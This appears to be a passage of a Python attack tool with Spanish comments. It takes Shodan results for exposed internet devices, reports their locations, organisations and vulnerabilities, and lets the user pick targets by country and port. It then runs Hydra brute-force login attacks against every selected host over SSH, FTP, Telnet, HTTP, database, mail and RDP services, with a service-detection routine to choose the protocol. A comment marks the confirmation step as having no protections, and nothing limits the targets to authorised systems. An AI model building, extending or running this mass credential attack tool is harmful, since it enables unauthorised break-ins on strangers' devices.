    print("="*80)
    
    for i, target in enumerate(targets, 1):
        print(f"\n[DEVICE {i}]")
        print(f"IP: {target['ip_str']}")
        print(f"Port: {target['port']}")
        print(f"Protocol: {target.get('transport', 'tcp').upper()}")
        print(f"Service: {target.get('product', 'Unknown')}")
        
        if target.get('version'):
            print(f"Version: {target['version']}")
        
        # Organization and ISP info
        if target.get('org'):
            print(f"Organization: {target['org']}")
        if target.get('isp'):
            print(f"ISP: {target['isp']}")
        if target.get('asn'):
            print(f"ASN: {target['asn']}")
        
        # Location info
        location = target.get('location', {})
        if location:
            location_parts = []
            if location.get('city'):
                location_parts.append(location['city'])
            if location.get('country_name'):
                location_parts.append(location['country_name'])
            if location_parts:
                print(f"Location: {', '.join(location_parts)}")
            if location.get('latitude') and location.get('longitude'):
                print(f"Coordinates: {location['latitude']}, {location['longitude']}")
        
        # Hostnames and domains
        if target.get('hostnames'):
            print(f"Hostnames: {', '.join(target['hostnames'])}")
        if target.get('domains'):
            print(f"Domains: {', '.join(target['domains'])}")
        
        # Operating system and device type
        if target.get('os'):
            print(f"OS: {target['os']}")
        if target.get('device_type'):
            print(f"Device Type: {target['device_type']}")
        
        # Web-specific info
        if target.get('title'):
            print(f"Web Title: {target['title']}")
        if target.get('server'):
            print(f"Web Server: {target['server']}")
        
        # Security info (SIMPLIFICADO - solo mostrar si hay vulns)
        if target.get('vulns'):
            vulns = target['vulns']
            if isinstance(vulns, dict) and vulns:
                vuln_count = len(vulns.keys())
                print(f"Vulnerabilities: {vuln_count} found")
            elif isinstance(vulns, list) and vulns:
                print(f"Vulnerabilities: {len(vulns)} found")
        
        if target.get('tags'):
            print(f"Tags: {', '.join(target['tags'])}")
        
        # SSL info
        if target.get('ssl'):
            ssl_info = target['ssl']
            if ssl_info.get('cert'):
                cert = ssl_info['cert']
                if cert.get('subject'):
                    print(f"SSL Subject: {cert['subject'].get('CN', 'N/A')}")
                if cert.get('issuer'):
                    print(f"SSL Issuer: {cert['issuer'].get('CN', 'N/A')}")
        
        # Timestamp
        if target.get('timestamp'):
            print(f"Last Seen: {target['timestamp']}")
        
        # Banner analysis (SIMPLIFICADO - solo mostrar banner)
        if target.get('banner'):
            banner = target['banner'].strip()
            if banner:
                # Show banner preview
                banner_preview = banner[:200] + "..." if len(banner) > 200 else banner
                print(f"Banner: {banner_preview}")

        print("-" * 80)
    
    # SUMMARY SECTION (SIMPLIFICADO)
    print("\n" + "="*80)
    print("SUMMARY REPORT")
    print("="*80)
    
    # Total devices
    print(f"Total devices found: {len(targets)}")
    
    # Breakdown by service/product
    services = {}
    for target in targets:
        service = target.get('product', 'Unknown')
        services[service] = services.get(service, 0) + 1
    
    print(f"\nServices breakdown:")
    for service, count in sorted(services.items(), key=lambda x: x[1], reverse=True):
        print(f"  {service}: {count} devices")
    
    # Breakdown by port
    ports = {}
    for target in targets:
        port = target['port']
        ports[port] = ports.get(port, 0) + 1
    
    print(f"\nPorts breakdown:")
    for port, count in sorted(ports.items(), key=lambda x: x[1], reverse=True):
        print(f"  Port {port}: {count} devices")
    
    # Breakdown by country
    countries = {}
    for target in targets:
        country = target.get('country_name', 'Unknown')
        countries[country] = countries.get(country, 0) + 1
    
    print(f"\nCountries breakdown:")
    for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True)[:10]:
        print(f"  {country}: {count} devices")
    
    # Organizations breakdown
    orgs = {}
    for target in targets:
        org = target.get('org') or 'Unknown'  # Handle None values
        orgs[org] = orgs.get(org, 0) + 1
    
    print(f"\nTop organizations:")
    for org, count in sorted(orgs.items(), key=lambda x: x[1], reverse=True)[:5]:
        org_name = org[:50] + "..." if len(org) > 50 else org
        print(f"  {org_name}: {count} devices")
    
    # Devices with potential security issues (SIMPLIFICADO)
    risky_devices = []
    for target in targets:
        banner = target.get('banner', '').lower()
        tags = target.get('tags', [])
        
        # Look for basic indicators only
        risk_indicators = []
        if 'default' in banner:
            risk_indicators.append('default in banner')
        if target.get('product') in ['webcam', 'camera', 'dvr']:
            risk_indicators.append('IoT device')
        
        if risk_indicators:
            risky_devices.append((target, risk_indicators))
    
    if risky_devices:
        print(f"\nPotentially vulnerable devices: {len(risky_devices)}")
        for target, indicators in risky_devices[:5]:
            print(f"  {target['ip_str']}:{target['port']} - {', '.join(indicators)}")
        if len(risky_devices) > 5:
            print(f"  ... and {len(risky_devices) - 5} more")
    
    print("="*80)
    
    # BRUTE FORCE SECTION
    bruteforce = input("\nDo you want to run brute-force attacks? (y/n): ")
    if bruteforce.lower() != "y":
        print("Finished.")
        return

    # MOSTRAR recomendaciones de wordlist antes de la selección
    show_wordlist_recommendations(targets)

    # STEP 1: Country selection
    print("\n" + "="*60)
    print("BRUTE FORCE TARGET SELECTION")
    print("="*60)
    
    # Get unique countries
    countries = {}
    for target in targets:
        country = target.get('country_name', 'Unknown')
        countries[country] = countries.get(country, 0) + 1
    
    # Sort countries by device count
    sorted_countries = sorted(countries.items(), key=lambda x: x[1], reverse=True)
    
    print("\nStep 1: Select target country")
    print("0. All countries")
    for i, (country, count) in enumerate(sorted_countries, 1):
        print(f"{i}. {country} ({count} devices)")
    
    # Country selection
    while True:
        try:
            country_choice = int(input(f"\nSelect country (0-{len(sorted_countries)}): "))
            if country_choice == 0:
                selected_country = "All"
                filtered_by_country = targets
                print(f"Selected: All countries ({len(targets)} devices)")
                break
            elif 1 <= country_choice <= len(sorted_countries):
                selected_country = sorted_countries[country_choice - 1][0]
                filtered_by_country = [target for target in targets 
                                     if target.get('country_name', 'Unknown') == selected_country]
                print(f"Selected: {selected_country} ({len(filtered_by_country)} devices)")
                break
            else:
                print(f"Invalid choice. Please select 0-{len(countries)}")
        except ValueError:
            print("Invalid input. Please enter a number.")
    
    if not filtered_by_country:
        print("No devices found in selected country.")
        return

    # STEP 2: Port selection
    print(f"\nStep 2: Select target port")
    
    # Get unique ports from filtered devices
    ports = {}
    for target in filtered_by_country:
        port = target['port']
        ports[port] = ports.get(port, 0) + 1
    
    # Define common ports and categorize
    common_web_ports = [80, 443, 8080, 8443, 8000, 8888]
    common_admin_ports = [21, 22, 23, 2222, 2323]
    common_other_ports = [25, 53, 110, 143, 993, 995, 1433, 3306, 5432]
    
    # Categorize found ports
    web_ports = {port: count for port, count in ports.items() if port in common_web_ports}
    admin_ports = {port: count for port, count in ports.items() if port in common_admin_ports}
    other_ports = {port: count for port, count in ports.items() 
                  if port not in common_web_ports and port not in common_admin_ports}
    
    port_options = []
    option_num = 1
    
    print("0. All ports")
    port_options.append(("all", list(ports.keys())))
    
    # Web ports
    if web_ports:
        print(f"\nWeb Services:")
        for port, count in sorted(web_ports.items()):
            print(f"{option_num}. Port {port} ({count} devices)")
            port_options.append(("single", port))
            option_num += 1
        
        # All web ports option
        print(f"{option_num}. All web ports ({sum(web_ports.values())} devices)")
        port_options.append(("category", list(web_ports.keys())))
        option_num += 1
    
    # Admin/Remote access ports
    if admin_ports:
        print(f"\nAdmin/Remote Access:")
        for port, count in sorted(admin_ports.items()):
            service_name = {21: "FTP", 22: "SSH", 23: "Telnet", 2222: "SSH alt", 2323: "Telnet alt"}.get(port, "Unknown")
            print(f"{option_num}. Port {port} - {service_name} ({count} devices)")
            port_options.append(("single", port))
            option_num += 1
        
        # All admin ports option
        print(f"{option_num}. All admin ports ({sum(admin_ports.values())} devices)")
        port_options.append(("category", list(admin_ports.keys())))
        option_num += 1
    
    # Other ports
    if other_ports:
        print(f"\nOther Services:")
        # Show top 10 other ports
        sorted_other = sorted(other_ports.items(), key=lambda x: x[1], reverse=True)[:10]
        for port, count in sorted_other:
            print(f"{option_num}. Port {port} ({count} devices)")
            port_options.append(("single", port))
            option_num += 1
        
        # All other ports option
        if len(other_ports) > 1:
            print(f"{option_num}. All other ports ({sum(other_ports.values())} devices)")
            port_options.append(("category", list(other_ports.keys())))
            option_num += 1
    
    # Port selection
    while True:
        try:
            port_choice = int(input(f"\nSelect port option (0-{len(port_options)-1}): "))
            if 0 <= port_choice < len(port_options):
                port_type, port_data = port_options[port_choice]
                
                if port_type == "all":
                    selected_ports = port_data
                    filtered_by_port = filtered_by_country
                    print(f"Selected: All ports ({len(filtered_by_port)} devices)")
                elif port_type == "single":
                    selected_ports = [port_data]
                    filtered_by_port = [target for target in filtered_by_country 
                                      if target['port'] == port_data]
                    print(f"Selected: Port {port_data} ({len(filtered_by_port)} devices)")
                elif port_type == "category":
                    selected_ports = port_data
                    filtered_by_port = [target for target in filtered_by_country 
                                      if target['port'] in port_data]
                    ports_str = ", ".join(map(str, sorted(port_data)))
                    print(f"Selected: Ports {ports_str} ({len(filtered_by_port)} devices)")
                break
            else:
                print(f"Invalid choice. Please select 0-{len(port_options)-1}")
        except ValueError:
            print("Invalid input. Please enter a number.")
    
    if not filtered_by_port:
        print("No devices found with selected ports.")
        return

    # STEP 3: Selección de wordlist
    username_list, password_list, wordlist_name = select_wordlist()

    # STEP 4: Final confirmation (SIMPLIFICADO - SIN PROTECCIONES)
    total_selected = len(filtered_by_port)
    combinations_per_target = len(username_list) * len(password_list)
    total_attempts = total_selected * combinations_per_target
    estimated_time = total_attempts * 2  # 2 seconds per attempt roughly
    estimated_minutes = estimated_time / 60
    
    print(f"\nStep 4: Final confirmation")
    print(f"Country: {selected_country}")
    print(f"Ports: {', '.join(map(str, sorted(selected_ports)))}")
    print(f"Targets: {total_selected}")
    print(f"Wordlist: {wordlist_name}")
    print(f"Total attempts: {total_attempts}")
    print(f"Estimated time: ~{estimated_minutes:.1f} minutes")
    
    # Group by service type for attack strategy
    service_groups = {}
    for target in filtered_by_port:
        port = target['port']
        if port in [21]:
            service_type = "ftp"
        elif port in [22, 2222]:
            service_type = "ssh"
        elif port in [23, 2323]:
            service_type = "telnet"
        elif port in [80, 8080, 8000, 8888]:
            service_type = "http"
        elif port in [443, 8443]:
            service_type = "https"
        else:
            service_type = f"port_{port}"
        
        if service_type not in service_groups:
            service_groups[service_type] = []
        service_groups[service_type].append(target)
    
    print(f"\nService breakdown:")
    for service, targets_list in service_groups.items():
        print(f"  {service}: {len(targets_list)} devices")
    
    # Final confirmation
    proceed = input(f"\nProceed with brute-force attack? (y/n): ")
    if proceed.lower() != 'y':
        print("Attack cancelled.")
        return

    # STEP 5: Execute brute force attacks
    print("\n" + "="*60)
    print("EXECUTING BRUTE FORCE ATTACKS")
    print("="*60)
    print(f"🎯 Using wordlist: {wordlist_name}")
    print(f"📊 Attacking {total_selected} targets")
    
    successful_attacks = 0
    
    for i, target in enumerate(filtered_by_port, 1):
        port = target['port']
        
        # CORREGIDO: Usar la función detect_service_advanced en lugar de la función local
        service = detect_service_advanced(target)
        
        print(f"\n[{i}/{total_selected}] Attacking {target['ip_str']}:{target['port']}")
        print(f"  Location: {target.get('country_name', 'Unknown')}")
        
        # Fix the organization display to handle None values
        org = target.get('org') or 'Unknown'
        org_display = org[:50] + "..." if len(org) > 50 else org
        print(f"  Organization: {org_display}")
        print(f"  Product: {target.get('product', 'Unknown')}")  # CORREGIDO: faltaba comilla de cierre
        print(f"  Detected service: {service if service else 'Unknown/Unsupported'}")
        
        # NUEVO: Intentar fallback para puertos no estándar sin servicio detectado
        if not service and port not in [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 3306, 3389, 5432]:
            print(f"      🤔 Non-standard port {port} with no clear service detection")
            
            # Intentar heurísticas adicionales
            fallback_service = None
            
            # Si el puerto está en rangos comunes, intentar HTTP primero
            if port in range(8000, 8100) or port in range(9000, 9100):
                print(f"      💡 Trying HTTP fallback for port {port}")
                fallback_service = "http"
            elif port in range(2000, 2100) or port in [2222, 2022]:
                print(f"      💡 Trying SSH fallback for port {port}")
                fallback_service = "ssh"
            elif port == 8883:  # MQTT over SSL, pero podría ser HTTPS
                print(f"      💡 Port 8883 might be HTTPS, trying fallback")
                fallback_service = "https"
            
            if fallback_service:
                print(f"      🎯 Attempting fallback attack with {fallback_service}")
                service = fallback_service
        
        # Lista de servicios soportados por Hydra
        supported_services = ['ftp', 'ssh', 'telnet', 'http-get', 'https-get', 'http-post-form', 'https-post-form', 'smtp', 'pop3', 'imap', 'mysql', 'postgres', 'mssql', 'rdp']
        
        # Solo atacar si el servicio es soportado por Hydra
        if service and service in supported_services:
            try:
                print(f"  🎯 Attacking with protocol: {service}")
                result = run_bruteforce(f"{target['ip_str']}:{target['port']}", 
                                      username_list, password_list, service)
                if result:  # If run_bruteforce returns True for success
                    successful_attacks += 1
                    
            except Exception as e:
                print(f"  ❌ Error attacking target: {e}")
                
                # NUEVO: Si falla, intentar con protocolo alternativo para puertos no estándar
                if not port in [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1433, 3306, 3389, 5432]:
                    alternative_services = []
                    if service == "http":
                        alternative_services = ["https"]
                    elif service == "https":
                        alternative_services = ["http"]
                    elif service == "ssh" and port != 22:
                        alternative_services = ["telnet"]
                    elif service == "telnet" and port != 23:
                        alternative_services = ["ssh"]
                    
                    for alt_service in alternative_services:
                        print(f"      🔄 Trying alternative protocol: {alt_service}")
                        try:
                            result = run_bruteforce(f"{target['ip_str']}:{target['port']}", 
                                                  username_list, password_list, alt_service)
                            if result:
                                successful_attacks += 1
                                break
                        except Exception as alt_e:
                            print(f"      ❌ Alternative {alt_service} also failed: {alt_e}")
        else:
            print(f"  ⚠️  Skipping - Protocol not supported by Hydra")
            if service:
                print(f"      💡 Port {port} detected as '{service}' - not bruteforceable")
            else:
                print(f"      💡 Port {port} - could not determine service type")
                # Mostrar información adicional para debug
                if target.get('banner'):
                    banner_preview = target['banner'][:150] + "..." if len(target['banner']) > 150 else target['banner']
                    print(f"      📄 Banner: {banner_preview}")
        
        # Delay entre targets
        if i < total_selected:  # No delay after last target
            import time
            print(f"  ⏳ Waiting 3 seconds before next target...")
            time.sleep(3)

    # Final summary
    print("\n" + "="*60)
    print("BRUTE FORCE ATTACK SUMMARY")
    print("="*60)
    print(f"Total targets attacked: {total_selected}")
    print(f"Successful attacks: {successful_attacks}")
    print(f"Success rate: {(successful_attacks/total_selected)*100:.1f}%" if total_selected > 0 else "0%")
    print(f"Country filter: {selected_country}")
    print(f"Port filter: {', '.join(map(str, sorted(selected_ports)))}")
    print(f"Wordlist used: {wordlist_name}")

# NUEVO: Detección avanzada de servicios usando los datos completos de Shodan
def detect_service_advanced(target):
    """
    Detección avanzada de servicios usando los datos completos de Shodan.
    Retorna el protocolo para Hydra o None si no es atacable.
    """
    port = target['port']
    product = target.get('product', '').lower() if target.get('product') else ''
    banner = target.get('banner', '').lower() if target.get('banner') else ''
    data = target.get('data', '').lower() if target.get('data') else banner
    transport = target.get('transport', 'tcp').lower()
    
    # NUEVO: Usar campos específicos de Shodan
    ssl_info = target.get('ssl', {})
    http_info = target.get('http', {})
    ssh_info = target.get('ssh', {})
    ftp_info = target.get('ftp', {})
    telnet_info = target.get('telnet', {})
    
    # Campos adicionales de Shodan que podemos usar
    cpe = target.get('cpe', [])  # Common Platform Enumeration
    tags = target.get('tags', [])
    device_type = target.get('devicetype', '')
    os_info = target.get('os', '')
    
    print(f"      🔍 Analyzing Shodan data for {target['ip_str']}:{port}")
    
    # PRIMERO: Verificar si es un puerto/protocolo NO SOPORTADO por Hydra
    unsupported_ports = {
        161: "SNMP",
        162: "SNMP Trap", 
        502: "Modbus",
        102: "Siemens S7",
        44818: "EtherNet/IP",
        1911: "Tridium Niagara Fox",
        20000: "DNP3",
        2404: "IEC 61850",
        47808: "BACnet",
        1962: "PCWorx",
        9600: "OMRON FINS",
        2455: "CODESYS",
        789: "Redlion Crimson",
        4000: "Emerson DeltaV",
        18245: "GE SRTP",
        18246: "GE SRTP",
        5094: "Hart-IP",
        4911: "Niagara AX",
        1089: "FF Annunciation",
        1090: "FF Fieldbus Message Specification",
        1628: "ProConOS"
    }
    
    if port in unsupported_ports:
        protocol_name = unsupported_ports[port]
        print(f"      ❌ Port {port} is {protocol_name} - NOT supported by Hydra")
        return None
    
    # Verificar protocolos industriales por producto/banner
    industrial_indicators = [
        'modbus', 's7-', 'siemens', 'schneider', 'rockwell', 'allen-bradley',
        'bacnet', 'dnp3', 'iec 61850', 'profinet', 'ethernet/ip',
        'codesys', 'tridium', 'niagara', 'crimson', 'deltav',
        'omron fins', 'hart-ip', 'ff fieldbus'
    ]
    
    for indicator in industrial_indicators:
        if indicator in product or indicator in banner:
            print(f"      ❌ Industrial protocol detected ({indicator}) - NOT supported by Hydra")
            return None
    
    # 1. DETECCIÓN POR CAMPOS ESPECÍFICOS DE SHODAN
    
    # HTTP/HTTPS detection usando el campo 'http' de Shodan - CORREGIDO PARA EVITAR POST-FORM
    if http_info:
        print(f"      ✅ Shodan HTTP data found")
        
        # Determinar si es HTTP o HTTPS
        is_https = ssl_info or port in [443, 8443, 9443] or 'https' in str(http_info).lower()
        protocol_base = "https" if is_https else "http"
        
        # NUEVO: Para evitar problemas con http-post-form, SIEMPRE usar http-get primero
        # Los formularios son complejos y requieren análisis manual
        print(f"      🔐 HTTP service detected -> {protocol_base}-get (safer than post-form)")
        return f"{protocol_base}-get"
    
    # SSH detection usando el campo 'ssh' de Shodan
    if ssh_info:
        print(f"      ✅ Shodan SSH data found -> ssh")
        return "ssh"
    
    # FTP detection usando el campo 'ftp' de Shodan
    if ftp_info:
        print(f"      ✅ Shodan FTP data found -> ftp")
        return "ftp"
    
    # Telnet detection usando el campo 'telnet' de Shodan
    if telnet_info:
        print(f"      ✅ Shodan Telnet data found -> telnet")
        return "telnet"
    
    # SSL detection - si hay SSL pero no HTTP, podría ser HTTPS u otro servicio SSL
    if ssl_info:
        cert = ssl_info.get('cert', {})
        if cert:
            print(f"      🔒 SSL certificate found")
            # Si es puerto web con SSL, es HTTPS
            if port in [443, 8443, 9443] or port in range(8000, 9000):
                print(f"      ✅ SSL on web port -> https-get")
                return "https-get"
    
    # 2. DETECCIÓN POR TAGS DE SHODAN (muy útil!)
    if tags:
        print(f"      🏷️  Shodan tags: {tags}")
        
        # Filtrar tags industriales que NO son soportados
        industrial_tags = ['ics', 'scada', 'modbus', 's7', 'bacnet', 'dnp3', 'profinet']
        has_industrial_tag = any(tag.lower() in industrial_tags for tag in tags)
        
        if has_industrial_tag:
            print(f"      ❌ Industrial system detected by tags - NOT supported by Hydra")
            return None
        
        # Solo procesar tags de servicios soportados - CORREGIDO: EVITAR POST-FORM
        for tag in tags:
            tag_lower = tag.lower()
            
            if tag_lower == 'ssh':
                print(f"      ✅ Service detected by tag 'ssh' -> ssh")
                return "ssh"
            elif tag_lower in ['http', 'web', 'apache', 'nginx', 'iis']:
                # Para servicios web, SIEMPRE usar GET (más seguro)
                is_https = ssl_info or port in [443, 8443, 9443]
                protocol_base = "https" if is_https else "http"
                print(f"      ✅ Web service detected by tag -> {protocol_base}-get")
                return f"{protocol_base}-get"
            elif tag_lower == 'https':
                print(f"      ✅ HTTPS detected by tag -> https-get")
                return "https-get"
            elif tag_lower == 'ftp':
                print(f"      ✅ Service detected by tag 'ftp' -> ftp")
                return "ftp"
            elif tag_lower == 'telnet':
                print(f"      ✅ Service detected by tag 'telnet' -> telnet")
                return "telnet"
            elif tag_lower in ['mysql', 'mariadb']:
                print(f"      ✅ MySQL detected by tag -> mysql")
                return "mysql"
            elif tag_lower in ['postgres', 'postgresql']:
                print(f"      ✅ PostgreSQL detected by tag -> postgres")
                return "postgres"
            elif tag_lower in ['mssql', 'sqlserver']:
                print(f"      ✅ MSSQL detected by tag -> mssql")
                return "mssql"
            elif tag_lower == 'smtp':
                print(f"      ✅ SMTP detected by tag -> smtp")
                return "smtp"
            elif tag_lower == 'pop3':
                print(f"      ✅ POP3 detected by tag -> pop3")
                return "pop3"
            elif tag_lower == 'imap':
                print(f"      ✅ IMAP detected by tag -> imap")
                return "imap"
    
    # 3. DETECCIÓN POR CPE (Common Platform Enumeration)
    if cpe:
        print(f"      🔧 CPE data found")
        for cpe_entry in cpe:
            cpe_lower = cpe_entry.lower()
            if 'apache' in cpe_lower or 'nginx' in cpe_lower or 'iis' in cpe_lower:
                print(f"      ✅ Web server detected in CPE")
                is_https = ssl_info or port in [443, 8443, 9443]
                protocol_base = "https" if is_https else "http"
                return f"{protocol_base}-get"
            elif 'openssh' in cpe_lower or 'dropbear' in cpe_lower:
                print(f"      ✅ SSH server detected in CPE -> ssh")
                return "ssh"
            elif 'mysql' in cpe_lower:
                print(f"      ✅ MySQL detected in CPE -> mysql")
                return "mysql"
            elif 'postgresql' in cpe_lower:
                print(f"      ✅ PostgreSQL detected in CPE -> postgres")
                return "postgres"
    
    # 4. DETECCIÓN POR PRODUCTO ESPECÍFICO (mejorada) - CORREGIDO: EVITAR POST-FORM
    if product:
        print(f"      📦 Product: {product}")
        
        # Web servers - SIEMPRE usar GET
        web_products = {
            'apache': 'apache',
            'nginx': 'nginx', 
            'iis': 'microsoft iis',
            'lighttpd': 'lighttpd',
            'tomcat': 'apache tomcat',
            'jetty': 'jetty',
            'caddy': 'caddy',
            'cherokee': 'cherokee'
        }
        
        for prod_keyword, prod_name in web_products.items():
            if prod_keyword in product:
                print(f"      ✅ Web server detected: {prod_name}")
                
                # Determinar protocolo base
                is_https = ssl_info or port in [443, 8443, 9443]
                protocol_base = "https" if is_https else "http"
                
                print(f"      🌐 Using {protocol_base}-get (simpler and more reliable)")
                return f"{protocol_base}-get"
        
        # Otros servicios no-web
        other_services = {
            'openssh': 'ssh',
            'dropbear': 'ssh',
            'libssh': 'ssh',
            'bitvise': 'ssh',
            'vsftpd': 'ftp',
            'proftpd': 'ftp',
            'pure-ftpd': 'ftp',
            'filezilla': 'ftp',
            'mysql': 'mysql',
            'mariadb': 'mysql',
            'postgresql': 'postgres',
            'microsoft sql server': 'mssql',
            'postfix': 'smtp',
            'sendmail': 'smtp',
            'dovecot': 'imap',
                       'courier': 'imap'
        }
        
        for prod_keyword, service in other_services.items():
            if prod_keyword in product:
                print(f"      ✅ Service detected by product '{prod_keyword}' -> {service}")
                return service
    
    # 5. DETECCIÓN POR PUERTOS ESTÁNDAR (alta confianza) - CORREGIDO: EVITAR POST-FORM
    if port in [80, 8080, 8000, 8888]:
        print(f"      ✅ Standard HTTP port -> http-get")
        return "http-get"
    elif port in [443, 8443, 9443]:
        print(f"      ✅ Standard HTTPS port -> https-get")
        return "https-get"
    
    # Otros puertos estándar (sin cambios)
    standard_ports = {
        21: "ftp",
        22: "ssh", 2222: "ssh",
        23: "telnet", 2323: "telnet",
        25: "smtp",
        110: "pop3",
        143: "imap",
        993: "imaps",
        995: "pop3s",
        1433: "mssql",
        3306: "mysql",
        3389: "rdp",
        5432: "postgres"
    }
    
    if port in standard_ports:
        detected_service = standard_ports[port]
        print(f"      ✅ Standard port mapping -> {detected_service}")
        return detected_service
    
    # 6. ANÁLISIS DE BANNER INTELIGENTE (último recurso) - CORREGIDO: EVITAR POST-FORM
    if data:
        print(f"      📄 Analyzing banner content...")
        
        # Verificar si es un banner de protocolo industrial
        if any(keyword in data for keyword in ['snmp:', 'modbus', 'vendor id:', 'product name:', 'serial number:']):
            print(f"      ❌ Industrial protocol banner detected - NOT supported by Hydra")
            return None
        
        # Web server indicators en banner - USAR SOLO GET
        web_indicators = [
            'http/1.', 'http/2.', 'server:', 'content-type:', 'content-length:',
            'www-authenticate:', 'set-cookie:', 'location:', '<html', '<!doctype'
        ]
        
        web_score = sum(1 for indicator in web_indicators if indicator in data)
        if web_score >= 2:
            print(f"      ✅ Web service detected by banner (score: {web_score})")
            
            # Determinar protocolo
            is_https = ssl_info or 'ssl' in data or 'tls' in data or port in [443, 8443, 9443]
            protocol_base = "https" if is_https else "http"
            
            print(f"      🌐 Using {protocol_base}-get (reliable method)")
            return f"{protocol_base}-get"
        
        # SSH indicators
        if 'ssh-2.0' in data or 'ssh-1.' in data or 'openssh' in data:
            print(f"      ✅ SSH detected by banner -> ssh")
            return "ssh"
        
        # FTP indicators
        if data.startswith('220 ') and ('ftp' in data or 'file transfer' in data):
            print(f"      ✅ FTP detected by banner -> ftp")
            return "ftp"
        
        # Telnet indicators
        if any(indicator in data for indicator in ['login:', 'username:', 'password:', 'welcome to']):
            print(f"      ✅ Telnet detected by banner -> telnet")
            return "telnet"
    
    # 7. HEURÍSTICAS POR RANGO DE PUERTO (baja confianza) - CORREGIDO: EVITAR POST-FORM
    if port in range(8000, 8100) or port in range(9000, 9100):
        # Verificar que no sea un puerto industrial conocido
        if port not in [8502, 8080, 8443]:  # Excluir algunos puertos industriales
            print(f"      💡 Port {port} in web range")
            
            # Determinar protocolo por puerto
            is_https = port in [8443, 9443] or port in range(8400, 8500)
            protocol_base = "https" if is_https else "http"
            
            print(f"      🌐 Trying {protocol_base}-get fallback")
            return f"{protocol_base}-get"
    elif port in range(2000, 2100) and port not in [2049, 2404]:  # Excluir NFS e IEC
        print(f"      💡 Port {port} in SSH range, trying SSH fallback")
        return "ssh"
    
    # Si llegamos aquí, no se pudo determinar o no es soportado
    print(f"      ❓ Unable to determine attackable service type")
    return None

def run_from_previous_results():
    """Load and attack previous results."""
    results, targets = load_results_from_json()
    
    if results and targets:
        execute_original_brute_force_flow(targets)
    else:
        print("❌ Failed to load previous results.")

if __name__ == "__main__":
    main()